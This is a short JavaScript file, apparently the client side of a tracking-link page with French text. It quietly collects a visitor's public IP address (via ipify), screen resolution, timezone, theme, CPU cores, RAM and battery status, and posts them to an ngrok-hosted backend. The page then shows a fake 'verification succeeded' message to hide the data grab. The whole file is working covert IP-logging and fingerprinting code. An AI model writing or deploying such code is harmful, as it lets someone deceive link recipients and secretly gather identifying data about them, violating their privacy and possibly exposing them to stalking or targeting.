const urlParams = new URLSearchParams(window.location.search);
const linkId = urlParams.get('id');
const BACKEND_URL = "https://activism-suggest-probation.ngrok-free.dev/save-data";

if (!linkId) {
    document.getElementById('status').innerText = "Erreur : lien inexistant : réessayez ou demandez un nouveau lien à votre fournisseur. ";
} else {
    Promise.all([
        fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: null })),
        navigator.getBattery ? navigator.getBattery().catch(() => null) : Promise.resolve(null)
    ]).then(([ipData, battery]) => {
        const donnéesAEnvoyer = {
            id_lien: linkId,
            forceIPv4: ipData.ip,
            resolution: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sombre' : 'Clair',
            processeur: navigator.hardwareConcurrency || 'Inconnu',
            ram: navigator.deviceMemory || 'Inconnu',
            batterie: battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? 'En charge' : 'Sur batterie'})` : 'Inconnue'
        };

        return fetch(BACKEND_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "ngrok-skip-browser-warning": "any-value"
            },
            body: JSON.stringify(donnéesAEnvoyer)
        });
    })
    .then(() => {
        document.getElementById('status').innerText = "Vérification réussie ! Vous pouvez retourner à votre activité précédente.";
    })
    .catch(() => {
        document.getElementById('status').innerText = "Erreur de connexion au serveur";
    });
}